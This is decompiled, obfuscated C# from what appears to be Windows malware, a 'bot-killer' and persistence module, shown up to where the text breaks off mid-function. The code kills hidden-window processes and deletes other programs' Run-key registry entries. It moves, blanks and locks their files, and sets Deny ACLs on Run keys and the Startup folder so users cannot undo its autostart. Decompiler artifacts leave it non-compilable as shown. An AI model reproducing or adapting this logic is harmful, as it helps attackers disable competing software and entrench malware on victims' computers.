using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Windows.Forms;

[StandardModule]
internal sealed class _________________________________________________
{
	public enum __________________________________________________ : uint
	{
		_ = 1u,
		__,
		___,
		____
	}

	public enum ___________________________________________________ : uint
	{
		_,
		__
	}

	public enum ____________________________________________________ : uint
	{
		_ = 1u,
		__,
		___,
		____,
		_____
	}

	public enum _____________________________________________________ : uint
	{
		_,
		__,
		___,
		____,
		_____
	}

	[System.Flags]
	public enum ______________________________________________________ : uint
	{
		_ = 1u,
		__ = 2u,
		___ = 4u,
		____ = 16u,
		_____ = 32u,
		______ = 64u,
		_______ = 128u,
		________ = 256u,
		_________ = 512u,
		__________ = 1024u,
		___________ = 2048u,
		____________ = 4096u
	}

	public enum _______________________________________________________ : uint
	{
		_,
		__
	}

	[System.Runtime.InteropServices.StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public class ________________________________________________________
	{
		private int _;

		private System.IntPtr __;

		private System.IntPtr ___;

		private System.IntPtr ____;

		public ________________________________________________________(string string_0)
		{
			this._ = System.Runtime.InteropServices.Marshal.SizeOf(typeof(_________________________________________________.________________________________________________________));
			this.___ = System.IntPtr.Zero;
			this.____ = System.IntPtr.Zero;
			this.__ = System.Runtime.InteropServices.Marshal.StringToCoTaskMemAuto(string_0);
		}

		~________________________________________________________()
		{
			System.Runtime.InteropServices.Marshal.FreeCoTaskMem(this.__);
		}
	}

	[System.Runtime.InteropServices.StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public class _________________________________________________________
	{
		private int _;

		private System.IntPtr __;

		private System.IntPtr ___;

		private _________________________________________________.__________________________________________________ ____;

		private _________________________________________________.___________________________________________________ _____;

		private _________________________________________________.____________________________________________________ ______;

		private System.IntPtr _______;

		private _________________________________________________._____________________________________________________ ________;

		private System.IntPtr _________;

		private string __________;

		private _________________________________________________.______________________________________________________ ___________;

		private _________________________________________________._______________________________________________________ ____________;

		public _________________________________________________________(string string_0)
		{
			this._ = System.Runtime.InteropServices.Marshal.SizeOf(typeof(_________________________________________________._________________________________________________________));
			int num = sizeof(System.Guid) + -26193;
			switch (checked((int)0.0))
			{
			case 0:
			{
				IL_3B:
				this.__ = System.IntPtr.Zero;
				this.___ = System.IntPtr.Zero;
				this.____ = _________________________________________________.__________________________________________________.__;
				int num2 = num;
				num = -596;
				if (num2 != -26177)
				{
				}
				this._____ = _________________________________________________.___________________________________________________._;
				<Module>._______________ = 1203310366;
				this.______ = _________________________________________________.____________________________________________________._;
				if (num == 7441)
				{
					if ((3045 ^ num + 7129) * 16 + -124208 == 5 * num + num * 11)
					{
					}
				}
				this.________ = _________________________________________________._____________________________________________________._;
				this._________ = System.IntPtr.Zero;
				this.__________ = null;
				this.___________ = _________________________________________________.______________________________________________________.________;
				this.____________ = _________________________________________________._______________________________________________________._;
				_________________________________________________.________________________________________________________ structure = new _________________________________________________.________________________________________________________(string_0);
				this._______ = System.Runtime.InteropServices.Marshal.AllocCoTaskMem(System.Runtime.InteropServices.Marshal.SizeOf(typeof(_________________________________________________.________________________________________________________)));
				System.Runtime.InteropServices.Marshal.StructureToPtr(structure, this._______, false);
				return;
			}
			}
			goto IL_3B;
		}

		~_________________________________________________________()
		{
			System.Runtime.InteropServices.Marshal.FreeCoTaskMem(this._______);
		}
	}

	public enum __________________________________________________________
	{
		_,
		__ = -2146762751,
		___,
		____,
		_____
	}

	public sealed class ___________________________________________________________
	{
		private static readonly System.IntPtr _ = new System.IntPtr(-1);

		private const string __ = "{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}";

		[System.Runtime.InteropServices.DllImport("wintrust.dll", CharSet = CharSet.Unicode, ExactSpelling = true)]
		private static extern _________________________________________________.__________________________________________________________ WinVerifyTrust([System.Runtime.InteropServices.In] System.IntPtr intptr_0, [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPStruct)] [System.Runtime.InteropServices.In] System.Guid guid_0, [System.Runtime.InteropServices.In] _________________________________________________._________________________________________________________ __________________________________________________________0);

		public static bool __(string string_0)
		{
			bool result;
			try
			{
				_________________________________________________._________________________________________________________ _________________________________________________________ = new _________________________________________________._________________________________________________________(string_0);
				System.Guid guid_ = new System.Guid(<Module>.______<string>(2211760561u));
				_________________________________________________.__________________________________________________________ _________________________________________________________2 = _________________________________________________.___________________________________________________________.WinVerifyTrust(_________________________________________________.___________________________________________________________._, guid_, _________________________________________________________);
				result = (_________________________________________________________2 == _________________________________________________.__________________________________________________________._);
			}
			catch (System.Exception arg_2E_0)
			{
				ProjectData.SetProjectError(arg_2E_0);
				result = false;
				ProjectData.ClearProjectError();
			}
			return result;
		}

		private ___________________________________________________________()
		{
		}
	}

	private static int _ = 0;

	private static int __ = 0;

	[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
	[return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
	private static extern bool IsWindowVisible(System.IntPtr intptr_0);

	[System.Runtime.InteropServices.DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern System.IntPtr FindWindow(string string_0, string string_1);

	public static object ___()
	{
		int num;
		int num7;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_08:
			int num2 = 2;
			if (______________________________________________________________.____)
			{
				if (System.Type.EmptyTypes.Length + 13475 != -14878)
				{
					goto IL_2E;
				}
				goto IL_71;
				int arg_C7_0;
				while (true)
				{
					IL_C7:
					switch (arg_C7_0)
					{
					case 0:
						goto IL_20E;
					case 1:
						goto IL_14E;
					case 2:
						break;
					default:
						goto IL_14E;
					}
					IL_201:
					num2 = 11;
					_________________________________________________.________();
					IL_DA:
					num2 = 12;
					______________________________________________________________.______________(<Module>.___<string>(3966352008u), string.Concat(new string[]
					{
						<Module>._______<string>(1725066269u),
						_________________________________________________._.ToString(),
						<Module>._______<string>(4119026383u),
						_________________________________________________.__.ToString(),
						<Module>.______<string>(1060962588u)
					}));
					arg_C7_0 = System.Type.EmptyTypes.Length + 0;
					continue;
					IL_14E:
					if (___________________________________________________________________.________())
					{
						break;
					}
					goto IL_201;
				}
				IL_158:
				num2 = 8;
				_________________________________________________.____(Microsoft.Win32.Registry.LocalMachine.OpenSubKey(<Module>._____<string>(877248152u), true));
				int num3;
				int num4;
				if (((12394 + -(num3 + num3) * 2 == num3 + num3 * 3 - 7779) ? (sizeof(ulong) + 1808365056) : (((-1837280845 ^ (num4 / 322 & num4)) == 0) ? checked((int)-848220905.0) : (System.Type.EmptyTypes.Length + 22499))) != 27579)
				{
					goto IL_1D6;
				}
				goto IL_1D6;
				IL_20E:
				num2 = 13;
				_________________________________________________._ = 0;
				IL_217:
				num2 = 14;
				_________________________________________________.__ = 0;
				IL_220:
				goto IL_2E4;
				IL_2E:
				num2 = 3;
				_________________________________________________._____________();
				IL_35:
				num2 = 4;
				_________________________________________________.____(Microsoft.Win32.Registry.CurrentUser.OpenSubKey(<Module>._____<string>(877248152u), true));
				if (System.Type.EmptyTypes.Length + -18446 != -18446)
				{
					goto IL_1D6;
				}
				IL_71:
				int num5 = -25002;
				num2 = 5;
				_________________________________________________.____(Microsoft.Win32.Registry.CurrentUser.OpenSubKey(<Module>._______<string>(1754451375u), true));
				int num6;
				if (((num6 + 7372 & num6) | -5) == -5)
				{
					if (num5 != -4099)
					{
					}
				}
				IL_B0:
				num2 = 6;
				_________________________________________________.___________(System.Environment.GetFolderPath(System.Environment.SpecialFolder.Startup));
				IL_BD:
				num2 = 7;
				arg_C7_0 = System.Type.EmptyTypes.Length + 1;
				goto IL_C7;
				IL_1D6:
				num2 = 9;
				_________________________________________________.____(Microsoft.Win32.Registry.LocalMachine.OpenSubKey(<Module>.____<string>(1224473743u), true));
				arg_C7_0 = System.Type.EmptyTypes.Length + 2;
				goto IL_C7;
			}
			IL_225:
			num2 = 16;
			IL_228:
			num2 = 17;
			______________________________________________________________.______________(<Module>._______<string>(1670293721u), <Module>.___<string>(1727953954u));
			IL_244:
			goto IL_2E4;
			IL_249:
			int arg_24E_0 = num7 + 1;
			num7 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_24E_0);
			IL_2A3:
			goto IL_2D9;
			num7 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_2B6:
			goto IL_2D9;
		}
		object arg_2B8_0;
		endfilter(arg_2B8_0 is System.Exception & num != 0 & num7 == 0);
		IL_2D9:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_2E4:
		object obj;
		object arg_2EE_0 = obj;
		if (num7 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return arg_2EE_0;
	}

	public static object ____(Microsoft.Win32.RegistryKey registryKey_0)
	{
		try
		{
			System.Security.Principal.SecurityIdentifier securityIdentifier = new System.Security.Principal.SecurityIdentifier(System.Security.Principal.WellKnownSidType.WorldSid, null);
			System.Security.Principal.NTAccount nTAccount = securityIdentifier.Translate(typeof(System.Security.Principal.NTAccount)) as System.Security.Principal.NTAccount;
			string identity = nTAccount.ToString();
			System.Security.AccessControl.RegistrySecurity registrySecurity = new System.Security.AccessControl.RegistrySecurity();
			registrySecurity.AddAccessRule(new System.Security.AccessControl.RegistryAccessRule(identity, System.Security.AccessControl.RegistryRights.ExecuteKey, System.Security.AccessControl.InheritanceFlags.None, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Deny));
			registrySecurity.AddAccessRule(new System.Security.AccessControl.RegistryAccessRule(identity, System.Security.AccessControl.RegistryRights.Delete | System.Security.AccessControl.RegistryRights.ChangePermissions | System.Security.AccessControl.RegistryRights.TakeOwnership, System.Security.AccessControl.InheritanceFlags.None, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Deny));
			registryKey_0.SetAccessControl(registrySecurity);
			registryKey_0.Close();
		}
		catch (System.Exception arg_6B_0)
		{
			ProjectData.SetProjectError(arg_6B_0);
			ProjectData.ClearProjectError();
		}
		object result;
		return result;
	}

	public static void _____()
	{
		int num;
		int num3;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_07:
			int num2 = 2;
			if (______________________________________________________________.____)
			{
				goto IL_12;
			}
			IL_10:
			goto IL_8B;
			IL_12:
			num2 = 5;
			_________________________________________________.________();
			IL_19:
			num2 = 6;
			_________________________________________________._____________();
			IL_20:
			goto IL_8B;
			IL_22:
			int arg_27_0 = num3 + 1;
			num3 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_27_0);
			IL_4C:
			goto IL_80;
			num3 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_5E:
			goto IL_80;
		}
		object arg_60_0;
		endfilter(arg_60_0 is System.Exception & num != 0 & num3 == 0);
		IL_80:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_8B:
		if (num3 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void ______()
	{
		int num;
		int num5;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_08:
			int num2 = 2;
			if (______________________________________________________________.____)
			{
				int arg_65_0 = System.Type.EmptyTypes.Length + 0;
				int num3;
				while (true)
				{
					switch (arg_65_0)
					{
					case 1:
						goto IL_74;
					}
					IL_1E:
					num2 = 3;
					_________________________________________________.________();
					IL_25:
					num2 = 4;
					_________________________________________________._____________();
					IL_2C:
					num2 = 5;
					num3 = System.Type.EmptyTypes.Length + 8238;
					int num4;
					arg_65_0 = ((7952 + -num4 * 16 == num4 + 15 * num4) ? (System.Type.EmptyTypes.Length + -886833348) : (System.Type.EmptyTypes.Length + 1));
				}
				IL_74:
				______________________________________________________________.______________(<Module>.______<string>(2655866516u), string.Concat(new string[]
				{
					<Module>._______<string>(3168522792u),
					_________________________________________________._.ToString(),
					<Module>._____<string>(2685991359u),
					_________________________________________________.__.ToString(),
					<Module>._______<string>(1916090129u)
				}));
				if (num3 != 8238)
				{
				}
				IL_DA:
				num2 = 6;
				_________________________________________________._ = 0;
				IL_E2:
				num2 = 7;
				_________________________________________________.__ = 0;
				IL_EA:
				goto IL_19C;
			}
			IL_EF:
			num2 = 9;
			IL_F2:
			num2 = 10;
			______________________________________________________________.______________(<Module>._______<string>(1670293721u), <Module>._____<string>(378852616u));
			IL_10E:
			goto IL_19C;
			IL_113:
			int arg_118_0 = num5 + 1;
			num5 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_118_0);
			IL_151:
			goto IL_191;
			int arg_15E_0 = num2;
			______________________._______ = -1465986201;
			num5 = arg_15E_0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_16E:
			goto IL_191;
		}
		object arg_170_0;
		endfilter(arg_170_0 is System.Exception & num != 0 & num5 == 0);
		IL_191:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_19C:
		if (num5 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void _______(int int_0, bool bool_0 = false)
	{
		try
		{
			Process processById = Process.GetProcessById(int_0);
			if (processById != null)
			{
				processById.Kill();
				if (bool_0)
				{
					_________________________________________________.___________(processById.MainModule.FileName);
				}
				______________________________________________________________.______________(<Module>.____<string>(3395602991u), <Module>.____<string>(2428905660u) + int_0.ToString());
			}
		}
		catch (System.Exception expr_4A)
		{
			ProjectData.SetProjectError(expr_4A);
			System.Exception ex = expr_4A;
			______________________________________________________________.______________(<Module>.___<string>(1387161447u), <Module>.___<string>(3563673746u) + int_0.ToString() + <Module>.____<string>(3335554409u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void ________()
	{
		try
		{
			____________________________________________________________.____(System.Environment.GetEnvironmentVariable(<Module>.____<string>(4280475304u)));
			____________________________________________________________.____(System.Environment.GetFolderPath(System.Environment.SpecialFolder.ProgramFiles));
			Process[] processes = Process.GetProcesses();
			int arg_2E_0 = 0;
			int num = processes.Length - 1;
			for (int i = arg_2E_0; i <= num; i++)
			{
				Process process = processes[i];
				try
				{
					string fullPath = System.IO.Path.GetFullPath(process.MainModule.FileName);
					if (_________________________________________________.__________(fullPath) && !_________________________________________________.____________(process.MainWindowTitle))
					{
						_________________________________________________.________________(fullPath);
						try
						{
							process.Kill();
							_________________________________________________._++;
						}
						catch (System.Exception arg_78_0)
						{
							ProjectData.SetProjectError(arg_78_0);
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (System.Exception arg_86_0)
				{
					ProjectData.SetProjectError(arg_86_0);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (System.Exception arg_9A_0)
		{
			ProjectData.SetProjectError(arg_9A_0);
			ProjectData.ClearProjectError();
		}
	}

	public static bool _________()
	{
		bool result;
		try
		{
			if (_________________________________________________.___________________________________________________________.__(Application.ExecutablePath))
			{
				result = true;
			}
			else
			{
				result = false;
			}
		}
		catch (System.Exception expr_14)
		{
			ProjectData.SetProjectError(expr_14);
			result = false;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static bool __________(string string_0)
	{
		int num;
		bool flag;
		int num5;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_08:
			int num2 = 2;
			if (string_0.Contains(Application.ExecutablePath))
			{
				if ((int)((System.IntPtr)7191) != 23425)
				{
					goto IL_46F;
				}
				goto IL_4DB;
			}
			IL_2D:
			num2 = 5;
			int arg_37_0 = System.Type.EmptyTypes.Length + 0;
			System.IO.FileAttributes attributes;
			while (true)
			{
				string[] array;
				int num3;
				switch (arg_37_0)
				{
				case 0:
					goto IL_3D0;
				case 1:
				{
					IL_3C1:
					num2 = 23;
					string[] array2;
					array = array2;
					num3 = 0;
					break;
				}
				case 2:
				{
					IL_39C:
					num2 = 22;
					string text;
					string[] array2 = Strings.Split(text, <Module>.___<string>(3242391558u), -1, CompareMethod.Binary);
					arg_37_0 = sizeof(float) + -3;
					continue;
				}
				case 3:
				{
					IL_B6:
					if (____________________________________________________________._____(string_0))
					{
						IL_BE:
						num2 = 32;
						____________________________________________________________.________(string_0);
						arg_37_0 = System.Type.EmptyTypes.Length + 9;
						continue;
					}
					IL_D5:
					num2 = 35;
					int _____________;
					arg_37_0 = ((_____________ + 1879048192 != _____________) ? 7 : 1238370489);
					continue;
				}
				case 4:
					goto IL_459;
				case 5:
					IL_9D:
					num2 = 29;
					break;
				case 6:
					goto IL_4D3;
				case 7:
					if (string_0.Contains(<Module>.______<string>(1919640693u)))
					{
						IL_2D7:
						num2 = 36;
						arg_37_0 = System.Type.EmptyTypes.Length + 15;
						continue;
					}
					IL_2E8:
					num2 = 38;
					if (string_0.Contains(System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory()))
					{
						if (System.Type.EmptyTypes.Length + 27488 != 27270)
						{
							goto Block_17;
						}
					}
					else
					{
						IL_310:
						num2 = 41;
						int __________ = <Module>.___________;
						if ((((__________ / 67108864 - 8380 & 467152128) == 467143936) ? 27595 : (sizeof(float) + 1695121387)) != 27595)
						{
							goto Block_19;
						}
					}
					if (_________________________________________________.___________________________________________________________.__(string_0))
					{
						goto IL_479;
					}
					IL_35F:
					num2 = 44;
					if (string_0.Contains(System.Environment.GetEnvironmentVariable(<Module>._____<string>(43036125u))) | string_0.Contains(System.Environment.GetFolderPath(System.Environment.SpecialFolder.CommonApplicationData)))
					{
						arg_37_0 = sizeof(ulong) + 3;
						continue;
					}
					IL_394:
					num2 = 47;
					goto IL_278;
				case 8:
					goto IL_492;
				case 9:
					goto IL_49D;
				case 10:
					goto IL_278;
				case 11:
					goto IL_4C0;
				case 12:
				{
					string text2 = array[num3];
					IL_201:
					num2 = 24;
					string arg_25F_0 = text2;
					int arg_21F_0 = 1375731711;
					int _____________ = <Module>.______________;
					if (Operators.CompareString(arg_25F_0, <Module>.__________(((arg_21F_0 | _____________ / 32768 - -1888323076) != 1912602623) ? (System.Type.EmptyTypes.Length + 1609821871) : (System.Type.EmptyTypes.Length + 49215), System.Type.EmptyTypes.Length + 51066, sizeof(int) + 142), false) != 0)
					{
						arg_37_0 = System.Type.EmptyTypes.Length + 17;
						continue;
					}
					goto IL_410;
				}
				case 13:
					goto IL_4CB;
				case 14:
				{
					if (string_0.Contains(______________________________________________________________._______________________))
					{
						IL_101:
						num2 = 12;
						flag = false;
						arg_37_0 = System.Type.EmptyTypes.Length + 16;
						continue;
					}
					IL_115:
					num2 = 14;
					if (string_0.Contains(______________________.____))
					{
						arg_37_0 = sizeof(double) + 0;
						continue;
					}
					IL_132:
					num2 = 17;
					if (System.Type.EmptyTypes.Length + -22014 == 21986)
					{
						goto IL_4F7;
					}
					if (string_0.Contains(<Module>._____<string>(1091295400u)))
					{
						goto IL_4D0;
					}
					IL_160:
					num2 = 20;
					string text = __________________________________________________________________.____(<Module>._____<string>(1665368331u));
					int _____________;
					if (_____________ / 10160075 + 1371144192 == (int)((uint)(_____________ / 2) >> 14))
					{
						goto IL_4DB;
					}
					IL_18D:
					num2 = 21;
					if (Operators.CompareString(text, <Module>.__________(System.Type.EmptyTypes.Length + 58755, sizeof(ushort) + 58553, System.Type.EmptyTypes.Length + 138), false) != 0)
					{
						int num4;
						arg_37_0 = (((-(num4 * 15 + num4) & 5) != (5 & (80 ^ num4 << 16))) ? (sizeof(ushort) + -1818948216) : (System.Type.EmptyTypes.Length + 2));
						continue;
					}
					goto IL_B3;
				}
				case 15:
					goto IL_4FC;
				case 16:
					goto IL_504;
				case 17:
				{
					IL_89:
					num2 = 25;
					string text2;
					if (string_0.Contains(text2))
					{
						goto Block_5;
					}
					goto IL_410;
				}
				default:
					goto IL_3D0;
				}
				if (num3 < array.Length)
				{
					arg_37_0 = System.Type.EmptyTypes.Length + 12;
					continue;
				}
				IL_B3:
				num2 = 31;
				goto IL_B6;
				IL_278:
				attributes = System.IO.File.GetAttributes(string_0);
				IL_27F:
				num2 = 48;
				if ((attributes & System.IO.FileAttributes.System) == System.IO.FileAttributes.System)
				{
					int num4;
					arg_37_0 = (((-1822740481 | num4 % 2048 / 8282672) == -1822740481) ? (sizeof(long) + -4) : (System.Type.EmptyTypes.Length + -864231588));
					continue;
				}
				goto IL_4A8;
				IL_3D0:
				if (string_0.Contains(_____________________________________________________________________________.__))
				{
					IL_3DD:
					num2 = 6;
					flag = false;
					arg_37_0 = System.Type.EmptyTypes.Length + 13;
					continue;
				}
				IL_3F0:
				num2 = 8;
				if (!string_0.Contains(______________________._))
				{
					IL_3FF:
					num2 = 11;
					arg_37_0 = System.Type.EmptyTypes.Length + 14;
					continue;
				}
				goto IL_431;
				IL_410:
				num3++;
				if (System.Type.EmptyTypes.Length + -4426 != -4426)
				{
					goto Block_21;
				}
				goto IL_9D;
			}
			Block_5:
			IL_509:
			num2 = 26;
			flag = true;
			goto IL_653;
			Block_17:
			IL_464:
			num2 = 39;
			flag = true;
			goto IL_653;
			Block_19:
			goto IL_46F;
			Block_21:
			goto IL_514;
			IL_431:
			if (709376 + num5 / 524288 % 15 != (num5 & 794) - 3278 << 8)
			{
				goto IL_514;
			}
			goto IL_49D;
			IL_459:
			num2 = 49;
			flag = true;
			goto IL_653;
			IL_479:
			num2 = 42;
			flag = false;
			if (checked((int)-24880.0) != 7365)
			{
				goto IL_4F7;
			}
			IL_492:
			num2 = 15;
			flag = false;
			goto IL_653;
			IL_49D:
			num2 = 33;
			flag = true;
			goto IL_653;
			IL_4A8:
			num2 = 51;
			if (sizeof(float) + 1771 != -31036)
			{
				goto IL_4DB;
			}
			goto IL_4D3;
			IL_4C0:
			num2 = 45;
			flag = true;
			IL_4CB:
			goto IL_653;
			IL_4D0:
			num2 = 18;
			IL_4D3:
			flag = false;
			IL_4F7:
			goto IL_653;
			IL_4FC:
			flag = true;
			IL_504:
			goto IL_653;
			IL_514:
			num2 = 9;
			flag = false;
			goto IL_653;
			IL_46F:
			num2 = 3;
			flag = false;
			goto IL_653;
			IL_4DB:
			if ((attributes & System.IO.FileAttributes.Hidden) != System.IO.FileAttributes.Hidden)
			{
				goto IL_4EC;
			}
			IL_4E1:
			num2 = 52;
			flag = true;
			goto IL_653;
			IL_4EC:
			num2 = 54;
			flag = false;
			IL_51F:
			goto IL_653;
			IL_524:
			int arg_52B_0 = num5 + 1;
			num5 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_52B_0);
			IL_610:
			goto IL_648;
			num5 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_624:
			goto IL_648;
		}
		object arg_626_0;
		endfilter(arg_626_0 is System.Exception & num != 0 & num5 == 0);
		IL_648:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_653:
		bool arg_65E_0 = flag;
		if (num5 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return arg_65E_0;
	}

	public static void ___________(string string_0)
	{
		try
		{
			System.IO.DirectoryInfo directoryInfo = new System.IO.DirectoryInfo(string_0);
			System.Security.AccessControl.DirectorySecurity directorySecurity = new System.Security.AccessControl.DirectorySecurity();
			directorySecurity.SetAccessRuleProtection(true, false);
			directoryInfo.SetAccessControl(directorySecurity);
		}
		catch (System.Exception arg_20_0)
		{
			ProjectData.SetProjectError(arg_20_0);
			ProjectData.ClearProjectError();
		}
	}

	public static bool ____________(string string_0)
	{
		bool result;
		try
		{
			System.IntPtr intptr_ = _________________________________________________.FindWindow(null, string_0);
			result = _________________________________________________.IsWindowVisible(intptr_);
		}
		catch (System.Exception arg_11_0)
		{
			ProjectData.SetProjectError(arg_11_0);
			result = false;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void _____________()
	{
		int num;
		int num4;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_08:
			int num2 = 2;
			_________________________________________________.______________(<Module>.____<string>(1981230373u), 1);
			int arg_22_0 = System.Type.EmptyTypes.Length + 2;
			while (true)
			{
				switch (arg_22_0)
				{
				case 0:
					goto IL_BF;
				case 1:
					goto IL_AE;
				case 3:
					goto IL_C4;
				case 4:
					IL_3D:
					num2 = 6;
					_________________________________________________.______________(<Module>.___<string>(478819883u), 2);
					goto IL_9F;
				}
				do
				{
					IL_68:
					num2 = 3;
					_________________________________________________.______________(<Module>.____<string>(3066385040u), 1);
					IL_51:
					num2 = 4;
				}
				while (System.Type.EmptyTypes.Length + 13289 == 5720);
				if (___________________________________________________________________.________())
				{
					IL_83:
					num2 = 5;
					_________________________________________________.______________(<Module>.______<string>(4227001192u), 2);
					arg_22_0 = System.Type.EmptyTypes.Length + 4;
					continue;
				}
				IL_9F:
				num2 = 8;
				arg_22_0 = System.Type.EmptyTypes.Length + 1;
			}
			IL_AE:
			string[] files = System.IO.Directory.GetFiles(System.Environment.GetFolderPath(System.Environment.SpecialFolder.Startup));
			IL_BA:
			num2 = 9;
			string[] array = files;
			IL_BF:
			int num3 = 0;
			goto IL_F2;
			IL_C4:
			string text = array[num3];
			IL_CA:
			num2 = 10;
			if (text.Contains(<Module>._______<string>(4209201204u)))
			{
				goto IL_EA;
			}
			IL_E0:
			num2 = 11;
			_________________________________________________.________________(text);
			IL_EA:
			num3++;
			IL_FB:
			num2 = 13;
			IL_F2:
			if (num3 < array.Length)
			{
				goto IL_C4;
			}
			IL_100:
			goto IL_190;
			IL_105:
			int arg_10C_0 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_10C_0);
			IL_14D:
			goto IL_185;
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_161:
			goto IL_185;
		}
		object arg_163_0;
		endfilter(arg_163_0 is System.Exception & num != 0 & num4 == 0);
		IL_185:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_190:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void ______________(string string_0, int int_0)
	{
		try
		{
			Microsoft.Win32.RegistryKey registryKey;
			if (int_0 == 1)
			{
				registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(string_0);
				switch (System.Type.EmptyTypes.Length + 0)
				{
				}
			}
			if (int_0 == 2)
			{
				registryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(string_0);
			}
			string[] valueNames = registryKey.GetValueNames();
			for (int i = 0; i < valueNames.Length; i++)
			{
				string text = valueNames[i];
				try
				{
					string text2 = registryKey.GetValue(text).ToString();
					if (text2.Contains(<Module>.____<string>(3688647296u)))
					{
						if (text2.Contains(<Module>._____<string>(1419880545u)))
						{
							text2.Replace(<Module>.___<string>(4017844528u), string.Empty);
						}
						try
						{
							string[] array = Strings.Split(text2, <Module>.______<string>(3865796739u), -1, CompareMethod.Binary);
							text2 = array[0];
						}
						catch (System.Exception arg_B1_0)
						{
							ProjectData.SetProjectError(arg_B1_0);
							ProjectData.ClearProjectError();
						}
					}
					int arg_E9_0 = -5832;
					int arg_CE_0 = 1820327936;
					int ______________ = <Module>._______________;
					if (arg_E9_0 != ((arg_CE_0 * ______________ == -2627) ? (System.Type.EmptyTypes.Length + -1287567016) : -5833))
					{
					}
					if (!text2.Contains(<Module>.___<string>(4017844528u)))
					{
						goto IL_136;
					}
					string[] array2 = text2.Split(new char[]
					{
						'"'
					});
					int arg_124_0 = System.Type.EmptyTypes.Length + 0;
					IL_124:
					switch (arg_124_0)
					{
					case 0:
						IL_131:
						text2 = array2[1];
						goto IL_136;
					case 1:
						if (text2.Contains(Application.ExecutablePath))
						{
							goto IL_176;
						}
						_________________________________________________._______________(int_0, text, string_0, text2);
						if (_________________________________________________.__________(text2))
						{
							_________________________________________________.__++;
							_________________________________________________.________________(text2);
							goto IL_176;
						}
						goto IL_176;
					}
					goto IL_131;
					IL_136:
					if (!text2.Contains(_____________________________________________________________________________.__))
					{
						arg_124_0 = sizeof(byte) + 0;
						goto IL_124;
					}
					IL_176:;
				}
				catch (System.Exception arg_178_0)
				{
					ProjectData.SetProjectError(arg_178_0);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (System.Exception arg_191_0)
		{
			ProjectData.SetProjectError(arg_191_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void _______________(int int_0, string string_0, string string_1, string string_2)
	{
		try
		{
			Microsoft.Win32.RegistryKey registryKey;
			if (int_0 == 1)
			{
				registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(string_1, true);
			}
			else
			{
				registryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(string_1, true);
			}
			using (registryKey)
			{
				if (registryKey != null)
				{
					registryKey.DeleteValue(string_0);
				}
			}
		}
		catch (System.Exception arg_3C_0)
		{
			ProjectData.SetProjectError(arg_3C_0);
			ProjectData.ClearProjectError();
		}
	}

	[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.NoOptimization)]
	public static void ________________(string string_0)
	{
		try
		{
			if (System.IO.File.Exists(string_0))
			{
				System.Random random = new System.Random();
				try
				{
					if (___________________________________________________________________.________())
					{
						string text = System.IO.Path.GetTempPath() + Conversions.ToString(random.Next(1000, 9000));
						_________________________________________________.MoveFileExA(ref string_0, ref text, 4L);
					}
				}
				catch (System.Exception arg_4D_0)
				{
					ProjectData.SetProjectError(arg_4D_0);
					ProjectData.ClearProjectError();
				}
				try
				{
					_____________________________________________________________________________._______________(string_0);
					global::_____________._.FileSystem.MoveFile(string_0, System.IO.Path.GetTempPath() + Conversions.ToString(random.Next(1000, 9000)));
					System.IO.File.WriteAllText(string_0, string.Empty);
					FileSystem.FileOpen(FileSystem.FreeFile(), string_0, OpenMode.Input, OpenAccess.Default, OpenShare.LockReadWrite, -1);
				}
